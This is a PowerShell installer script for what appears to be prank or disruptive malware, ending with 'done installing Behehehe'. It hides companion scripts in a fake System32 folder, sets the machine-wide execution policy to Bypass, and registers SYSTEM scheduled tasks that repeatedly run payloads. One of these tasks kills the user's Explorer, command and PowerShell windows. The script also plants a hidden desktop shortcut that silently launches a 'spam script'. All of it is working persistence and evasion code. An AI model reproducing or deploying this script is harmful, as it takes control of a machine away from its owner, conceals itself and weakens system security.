#path
$targetPath = "C:\Windows\System32\Com\en-US"

#create dir if it doean't exist
if (-not (Test-Path $targetPath)) {
    New-Item -ItemType Directory -Path $targetPath -Force | Out-Null
}


$scriptMap = @{
    "sys_usr.ps1"        = ".\sys_usr.ps1"
    "sys_win.ps1"        = ".\sys_win.ps1"
    "sys_log.ps1"        = ".\sys_log.ps1"
    "sticky_patch.ps1"   = ".\sticky_patch.ps1"
}

#copy files to the folder
foreach ($destName in $scriptMap.Keys) {
    $sourcePath = $scriptMap[$destName]
    $destPath = Join-Path $targetPath $destName
    Copy-Item -Path $sourcePath -Destination $destPath -Force
    attrib +h +s $destPath
}

#hide dir
attrib +h +s $targetPath

# bypass policies to execute scripts
try {
    Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine -Force
} catch {
    #if session was not open from admin
    Write-Host "Failed to set ExecutionPolicy. Try running as Administrator."
}

#scedule to restore and enable users every 3 minutes
schtasks /Create /TN "WinUserCheck" /SC MINUTE /MO 3 /RL HIGHEST /F /TR "powershell.exe -ExecutionPolicy Bypass -File `"$targetPath\sys_usr.ps1`"" /RU "SYSTEM"

# schedule to close all explorer cmd powershell windows (that was open by hands not the system one)
schtasks /Create /TN "WinWindowKill" /SC MINUTE /MO 10 /RL HIGHEST /F /TR "powershell.exe -ExecutionPolicy Bypass -File `"$targetPath\sys_win.ps1`"" /RU "SYSTEM"

#create invisible file for spam script
$shortcutPath = "$env:Public\Desktop\SystemService.lnk"
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($shortcutPath)
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$targetPath\sys_log.ps1`""
$Shortcut.IconLocation = "$env:SystemRoot\System32\shell32.dll,44"
$Shortcut.WindowStyle = 7
$Shortcut.Save()

# hide shortcut
attrib +h $shortcutPath

Write-Host "done installing Behehehe"